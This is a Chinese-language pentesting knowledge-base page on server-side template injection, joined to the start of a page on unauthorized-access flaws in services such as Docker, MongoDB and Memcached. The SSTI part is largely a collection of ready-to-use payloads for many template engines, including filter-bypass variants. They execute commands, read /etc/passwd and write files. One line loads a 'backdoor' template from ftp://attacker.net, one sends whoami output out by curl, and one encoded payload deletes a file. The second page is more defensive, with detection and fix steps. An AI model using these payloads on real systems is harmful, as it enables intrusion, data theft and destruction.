前后端分离：前端使用JavaScript框架，如(jquery，vue，react，angular)，前端项目化；后端去掉所有的视图，只提供api接口，用户在浏览器访问的路由为前端路由（也称为Hash路由，由前端响应），只加载前端视图，数据只通过ajax获取，前端获取数据之后再渲染到视图，前端负责控制路由，展示视图，后端只负责提供api，用户和视图交互，视图上的按钮以及页面数据和后端api交互；可以简单理解为访问一个URL后返回的是JSON等数据，而不是一个完全渲染好的html页面 从上面的描述，可以看出SSTI主要存在于前后端不分离的项目中。 模板可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。作为对比，一个很不好的解决方法是通过字符串拼接的方式来组成HTML文件，然后统一输出。 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档，简单来说 就是将模板文件和数据通过模板引擎的渲染生成最终的HTML代码。 流程如下所示： 模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。 挖掘和判定 最原始的方法是通过注入模板表达式中常用的一系列特殊字符来尝试模糊模板，例如${{，如果出现异常，则表明注入的模板语法可能正在以某种方式被服务器渲染解析，这就是可能存在服务器端模板注入漏洞的一个迹象。 如果发现存在了SSTI，那怎么判断是什么模版引擎的注入呢？ 1、报错 大量的模版语言都是类似的，我们可以选择一些不常规的payload让其抛出异常，这样我们就能确定模版引擎甚至版本号；比如使用无效表达式给基于Ruby的ERB模版引擎解析时，就会抛出异常： (erb):1:in `': undefined local variable or method `foobar' for main:Object (NameError) from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval' from /usr/lib/ruby/2.5.0/erb.rb:876:in `result' from -e:4:in `' 2、根据执行结果 如果没有报错，就只能根据每个模版语言的特性来识别了，一种常见的方法是使用来自不同模板引擎的语法注入任意数学运算，根据返回的结果来判断，有一张出圈的决策树图如下： 已知模版引擎问题 已知的一些模版和其是否存在问题 PHP中的SSTI Twig Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。 基础语法 Twig模版 1、使用双大括号分隔符{{ }}进行输出 2、使用大括号百分比定界符{% %}进行逻辑运算 3、使用{# #}用于评论、注释 {# 注释 #} {% for word in words %} {{ word }} {% endfor %} 环境搭建 教程 下载地址 注意：在2.0.0版本中，移除了Autoloader，但是网上很多千篇一律的twig SSTI搭环境都没讲这个，就会出问题。。。所以我们下载个v1.35.0 组件信息 | 使用组件 | 版本 | | -------- | ------ | | Twig | 1.35.0 | | php | 7.3.24 | 利用代码 它的render()方法通过其第一个参数载入模板，并通过第二个参数中的变量来传值渲染模板。正常情况下没有问题，但如果渲染的模版内容受到用户的控制，那么就会存在漏洞。 render(\"Hello {{name}}\", array(\"name\" => $_GET[\"name\"])); // 不存在SSTI情况 $output = $twig->render(\"Hello {$_GET['name']}\"); // 将用户输入作为模版变量的值 echo $output; ?> 快速启动PHP web环境 php -S 127.0.0.1:9999 大功告成 漏洞利用 前面也说了一般模版的渲染的时候，可以执行表达式 基础Payload {{2*2**3}} = 16 {# 这里要注意的是，#要写成%23，不然会被浏览器当成锚点 #} {{2*2**3}}{%23%20注释不会显示%20%23} = 16 ${7*7} = ${7*7} {{7*'7'}} = 49 {{1/0}} = Error {{foobar}} Nothing 其他的一些高风险payload，本地都没有测试成功，怀疑可能是Twig版本的问题？ {# Get Info #} {{_self}} #(Ref. to current application) {{_self.env}} {{dump(app)}} {{app.request.server.all|join(',')}} {# File read #} \"{{'/etc/passwd'|file_excerpt(1,30)}}\"@ {# Exec code #} {{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}} {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} {{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"whoami\")}} {{['id']|filter('system')}} {{['cat\\x20/etc/passwd']|filter('system')}} {{['cat$IFS/etc/passwd']|filter('system')}} {{[\"id\"]|map(\"system\")|join(\",\") {{[\"id\", 0]|sort(\"system\")|join(\",\")}} {{[\"id\"]|filter(\"system\")|join(\",\")}} {{[0, 0]|reduce(\"system\", \"id\")|join(\",\")}} {{{\" 参考 ssti-server-side-template-injection#twig-php TWIG 全版本通用 SSTI payloads Smarty Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function) 但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量； 比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法： https://github.com/smarty-php/smarty/blob/v3.1.11/libs/sysplugins/smarty_internal_data.php 中的 getStreamVariable() 方法可以获取传入变量的流 因此我们可以用这个方法读文件，payload: {self::getStreamVariable(\"file:///etc/passwd\")} 实在没找到环境怎么搭建，这里收集一下Payload吧 {$smarty.version} #获取smarty的版本号 {php}phpinfo();{/php} #执行相应的php代码，在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。 {if phpinfo()}{/if} # 执行相应的php代码 {self::getStreamVariable(\"file:///etc/passwd\")} # 任意文件读取 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"\",self::clearConfig())} # 文件写入 {system('ls')} # compatible v3 {system('cat index.php')} # compatible v3 {literal}alert('xss');{/literal} # XSS 参考链接 SSTI模板注入 ssti-server-side-template-injection#smarty-php Python中的SSTI Jinja2 Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的，是Flask框架的一部分。 基础语法 和Twig类似 {{ ... }}：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。 {% ... %}：装载一个控制语句。 {# ... #}：装载一个注释，模板渲染的时候会忽视这中间的值 变量 在模板中添加变量，可以使用（set）语句 {% set name='xx' %} 创建一个内部的作用域 with语句来创建一个内部的作用域，将set语句放在其中，这样创建的变量只在with代码块中才有效 {% with gg = 42 %} {{ gg }} {% endwith %} if 语句 {% if 1==1 %} {{ 7*7 }} {%else%} {{ 8*8 }} {% endif %} for 循环 {% for c in ['1','2','3'] %} {{c}} {%endfor%} 环境搭建 依赖 Python 3.7.9 Flask 1.1.2 Jinja2 3.0.1 演示代码 我们传入的get变量name，被当成模版内容传入到Jinja2进行渲染。 ```python !/usr/bin/env python from flask import Flask, request from jinja2 import Template app = Flask(name) @app.route('/') def index(): name = request.args.get('name', 'guest') t = Template(\"Hello \" + name) return t.render() if __name__ == \"__main__\": app.run() ``` 启动环境 python3 jinja2_ssti.py 大功告成 漏洞判定 执行最简单的表达式{{2**10}} ${7*7} = ${7*7} {{foobar}} = Nothing {{4*4}}[[5*5]] = 16[[5*5]] {{7*'7'}} = 7777777 {# 下面是需要内部有相关变量才能得到结果 #} {{config}} {{config.items()}} {{settings.SECRET_KEY}} {{settings}} {% debug %} 深入了解 主要是利用了Python的魔术方法，具体可以Google搜索：python沙盒逃逸 了解，简单介绍下： __class__ 返回示例所属的类 __mro__ 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回一个类所继承的基类 # __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 通过这些魔术方法的组合构造，就可以最大限度的执行到各种危险方法，比如读文件、执行系统命令 构造的Payload for c in [].__class__.__base__.__subclasses__(): if c.__name__ == 'catch_warnings': for b in c.__init__.__globals__.values(): if b.__class__ == {}.__class__: if 'eval' in b.keys(): print(b['eval']('__import__(\"os\").popen(\"id\").read()')) 加深利用 就是给上面构造出来的Payload转换成Jinja2可以执行的表达式 结果 {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 压缩一行 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %} 查看结果 其他的一些Payload {% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"whoami\").read()}}{%endif%}{% endfor %} {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %} 绕过 过滤[ {# getitem、pop #} {{ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() }} {{ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read() }} 过滤引号 {# chr函数 #} {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %} {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd {# 命令执行 #} {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %} {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }} {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id 过滤下划线 {{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }} 过滤花括号 #用{%%}标记 {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %} 参考 ssti-server-side-template-injection#jinja2-python tornado tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。 payload {% import foobar %} = Error {% import os %}{{os.system('whoami')}} Djanjo 这个比较难利用，条件被限制的很死，很难执行命令；但Django自带的应用 \"admin\"（也就是Django自带的后台）的models.py中导入了当前网站的配置文件，可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。 {user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY} {user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} Mako ${x} Java中的SSTI Velocity #set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\")$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 5\").waitFor() // CVE-2019-3396 #set($str=$class.inspect(\"java.lang.String\").type) #set($chr=$class.inspect(\"java.lang.Character\").type) #set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\")) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end FreeMarker 在线测试网站：https://try.freemarker.apache.org 基础Payload 49 = 49 ${7*7} = 49 #{7*7} = 49 -- (legacy) ${7*'7'} Nothing ${foobar} 高级Payload ${ ex(\"id\")} [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')} ${\"freemarker.template.utility.Execute\"?new()(\"id\")} ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")} Spring View Manipulation __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()}__::.x __${T(java.lang.Runtime).getRuntime().exec(\"touch executed\")}__::.x Pebble 基础Payload {{ someString.toUPPERCASE() }} 低版本Pebble ( {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }} 高版本 {% set cmd = 'id' %} {% set bytes = (1).TYPE .forName('java.lang.Runtime') .methods[6] .invoke(null,null) .exec(cmd) .inputStream .readAllBytes() %} {{ (1).TYPE .forName('java.lang.String') .constructors[0] .newInstance(([bytes]).toArray()) }} Jinjava {{'a'.toUpperCase()}} = 'A' {{ request }} = 会返回一个request对象形如 com.[...].context.TemplateContextRequest@23548206 命令执行（被修复：https://github.com/HubSpot/jinjava/pull/230） {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} NodeJS中的SSTI Handlebars {{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').exec('whoami');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} URL编码: %7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d JsRender XSS： {{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}} RCE: {{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()\")()}} PugJs 基础 #{7*7} = 49 RCE: #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('touch /tmp/pwned.txt')}()} Ruby中的SSTI ERB 基础： {{7*7}} = {{7*7}} ${7*7} = ${7*7} = 49 = Error 高级： #Execute code #List folder #Read file Slim Payload: { 7 * 7 } { %x|env| } 自动化工具 tplmap 支持一键getshell 支持模版引擎列表： | Engine | Remote Command Execution | Blind | Code evaluation | File read | File write | | ------------------------------ | ------------------------ | ----- | --------------- | --------- | ---------- | | Mako | ✓ | ✓ | Python | ✓ | ✓ | | Jinja2 | ✓ | ✓ | Python | ✓ | ✓ | | Python (code eval) | ✓ | ✓ | Python | ✓ | ✓ | | Tornado | ✓ | ✓ | Python | ✓ | ✓ | | Nunjucks | ✓ | ✓ | JavaScript | ✓ | ✓ | | Pug | ✓ | ✓ | JavaScript | ✓ | ✓ | | doT | ✓ | ✓ | JavaScript | ✓ | ✓ | | Marko | ✓ | ✓ | JavaScript | ✓ | ✓ | | JavaScript (code eval) | ✓ | ✓ | JavaScript | ✓ | ✓ | | Dust (1.19) | × | × | × | × | × | | Smarty (secured) | × | × | × | × | × | | Dust (> dustjs-helpers@1.5.0) | × | × | × | × | × | 使用 python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=*&comment=supercomment&link\" python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link\" --level 5 -e jade 参考 1. SSTI（模板注入）漏洞（入门篇） SSTI (Server Side Template Injection) Server Side Template Injection Server-side template injection Server-Side Template Injection Server-Side Template Injection(SSTI) Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 20:31:57 "},"个人知识库/01.渗透测试/02.WEB漏洞/06.未授权访问/01.未授权访问漏洞总结.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/06.未授权访问/01.未授权访问漏洞总结.html","title":"01.未授权访问漏洞总结","keywords":"","body":" 什么是未授权访问漏洞 CouchDB Docker 漏洞信息 检测方法 修复方法 Elasticsearch Hadoop Jenkins JBOSS 漏洞信息 检测方法 修复方法 Memcached 漏洞信息 检测方法 MongoDB 漏洞信息 检测方法 修复方法 Mysql nfs Redis 漏洞信息 修复方法 Rsync 漏洞信息 检测方法 修复方法 SpringBoot VNC 漏洞信息 检测方法 修复方法 ZooKeeper 漏洞信息 检测方法 修复方法 什么是未授权访问漏洞 未授权访问，顾名思义就是不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 CouchDB 端口：web端口 介绍：利用该未授权访问漏洞不仅会造成数据的丢失和泄露，甚至可执行任意系统命令。 使用工具： https://github.com/cwkiller/unauthorized-check 修复：参考 CouchDB未授权访问漏洞修复方案 Docker 端口：2375 介绍：通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等 使用工具： https://github.com/Tycx2ry/docker_api_vul https://github.com/cwkiller/unauthorized-check https://github.com/netxfly/docker-remote-api-exp 修复：参考 【漏洞修复】Docker remote api未授权访问复现和修复 漏洞信息 (1) 漏洞简述Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker 存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以脱离容器拿到宿主机权限。 (2) 风险等级高风险。 (3) 漏洞编号无。 (4) 影响范围Docker 1.3、Docker 1.6。 检测方法 先用 nmap 扫描查看端口开放情况。2375为 docker 端口如果存在漏洞会有以下情况url 输入 ip:2375/version 就会列出基本信息也可以执行目标服务器容器命令如 container、image 等。 修复方法 (1) 使用 TLS 认证。 (2) 网络访问控制Network Access Control Elasticsearch 端口：9200、9300 介绍：ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。 Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。 使用工具：浏览器直接访问如下地址 http://101.198.161.xxx:9200/_cat/indices/ http://101.198.161.xxx:9200/_plugin/head/ http://101.198.161.xxx:9200/_nodes/ http://101.198.161.xxx:9200/_status http: //101.198.161.xxx:9200/_search?pretty 修复：参考 ElasticSearch未授权访问漏洞修复方案 Hadoop 端口：web访问，80等 介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理。 使用工具： https://github.com/cwkiller/unauthorized-check https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py 修复： 如无必要，关闭Hadoop Web管理页面； 开启服务级别身份验证，如Kerberos认证； 部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问； 设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口 Jenkins 端口：web端口 介绍：未授权访问管理控制台,可以通过脚本命令行执行系统命令。通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件。 使用工具：浏览器、MSF 修复： 1、对后台控制页面做登录验证限制 2、升级版本 JBOSS 端口：web端口 介绍：JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 http://ip:8080/jmx-console 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。 使用工具： 浏览器 https://github.com/joaomatosf/jexboss https://github.com/xsr7yer/Web-Scan https://github.com/joaomatosf/JavaDeserH2HC 修复： 对jmx控制页面访问添加访问验证。 进行JMX Console 安全配置。 漏洞信息 (1) 漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 http://ip:8080/jmx-console 就可以浏览 jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。 (2) 风险等级高风险。 (3) 漏洞编号无。 (4) 影响范围JBOSS 全版本。 检测方法 先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 http://ip:jboss端口/ 看是否能进入 jmx-console 和 web-console 。 修复方法 JMX Console 安全配置 ① 找到 %JBOSS_HOME%/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml 文件去掉下面这段 xml 文本的注释。 ② 与 jboss-web.xml 同级的目录下还有一个文件 web.xml找到下面这段 xml 文本把 GET 和 POST 两行注释掉同时 security-constraint 整个部分取消注释, 不然存在head头绕过。 ③ %JBOSS_HOME%\\server\\default\\conf\\props\\jbossws-users.properties 中删除原始的 admin/admin添加新的用户名密码。 ④ %JBOSS_HOME%\\server\\default\\conf\\props\\jbossws-roles.properties 中定义新用户名所属角色。该文件定义的格式为用户名 = 角色多个角色以 “,” 隔开该文件默认为 admin 用户定义了 JBossAdmin 和 HttpInvoker 这两个角色。 # A sample roles.properties file foruse with the UsersRolesLoginModule kermit = JBossAdmin,HttpInvoker Memcached 端口：11211 介绍：Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。 使用工具： telnet、nc https://github.com/cwkiller/unauthorized-check https://github.com/aedoo/Memcache-Unauthorized 修复： vim /etc/sysconfig/memcached OPTIONS=\"-l 127.0.0.1\" #设置本地为监听 /etc/init.d/memcached restart #重启服务 漏洞信息 (1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key – Value 的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于 Memcached 的安全设计缺陷客户端连接 Memcached 服务器后无需认证就可读取、修改服务器缓存内容。 (2) 风险等级高风险。 (3) 漏洞编号CVE-2013-7239 。 (4) 影响范围Memcached 全版本。 检测方法 登录机器执行 netstat -an | more 命令查看端口监听情况。回显 0.0.0.0:1121111211 表示在所有网卡进行监听存在 Memcached 未授权访问漏洞。 telnet 11211 or nc -vv 11211 提示连接成功表示漏洞存在。 使用端口扫描工具 nmap 进行远程扫描 nmap -sV -p11211 --script memcached-info 修复方法 (1) 配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或 Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 iptables -A INPUT -p tcp -s 192.168.0.2 --dport 11211 -j ACCEPT (2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached 启动时指定绑定的 IP 地址为 127.0.0.1。例如 memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid (3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid (4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid (5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。 MongoDB 端口：27017 介绍：MongoDB服务安装后，默认未开启权限验证。如果服务监听在0.0.0.0，则可远程无需授权访问数据库； 3.0之前版本的MongoDB,默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。 3.0之前版本，如未添加用户管理员账号及数据库账号，使用--auth参数启动时，在本地通过127.0.0.1仍可无需账号密码登陆访问数据库，远程访问则提示需认证； 3.0及之后版本，使用--auth参数启动后，无账号则本地和远程均无任何数据库访问权限。 使用工具：MSF、navicat、nc、各种mongodb客户端 修复：参考 mongoDB设置用户名密码 漏洞信息 (1) 漏洞简述开启 MongoDB 服务时若不添加任何参数默认是没有权限验证的而且可以远程访问数据库登录的用户无需密码即可通过默认端口 27017 对数据库进行增、删、改、查等高危操作。刚安装完毕时MongoDB 都默认有一个 admin 数据库此时 admin 数据库为空没有记录权限相关的信息。当 admin.system.users 一个用户都没有时即使 MongoDB 启动时添加了 –auth 参数还是可以做任何操作不管是否以 –auth 参数启动直到在 admin.system.users 中添加了一个用户。 (2) 风险等级高风险。 (3) 漏洞编号无。 (4) 影响范围MongoDB 数据库。 检测方法 可以自己编制相应脚本或利用专用工具检测也可以查看配置文件 (1) 检测是否仅监听 127.0.0.1 --bind_ip 127.0.0.1 or vim /etc/mongodb.conf bind_ip = 127.0.0.1 (2) 检测是否开启 auth 认证 mongo 目标ip:端口号 show dbs；#列出有哪些数据库，数据库占用了多大的存储空间。 db；#当前连接的是哪个数据库 mongod --auth or vim /etc/mongodb.conf auth = true 修复方法 (1) 为 MongoDB 添加认证 ① MongoDB 启动时添加 -auth 参数。 ② 给 MongoDB 添加用户 use admin # 使用 admin 库 db.addUser“用户名” “密码”# 添加用户名、密码 db.auth“用户名”,“密码”# 验证是否添加成功返回 1 说明成功。 (2) 禁用 HTTP 和 REST 端口 MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过 Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数 nohttpinterface = false。 (3) 限制绑定 IP 启动时加入参数 --bind_ip 127.0.0.1 或在 /etc/mongodb.conf 文件中添加以下内容 bind_ip = 127.0.0.1 Mysql 端口:3306 介绍：未授权访问，可读取数据库中的数据，可尝试在web路径下写webshell，udf提权等 使用工具：MSF、navicat、各种mysql客户端 修复：参考 MySQL修改密码的3种方式 nfs 端口：2049 介绍：配置不当时，可以远程挂载nfs的共享目录 使用工具： apt install nfs-common 安装nfs客户端 showmount -e xx.xx.xx.xx 查看nfs服务器上的共享目录 mount -t nfs xx.xx.xx.xx:/grdata /mnt 挂载到本地 umount /mnt 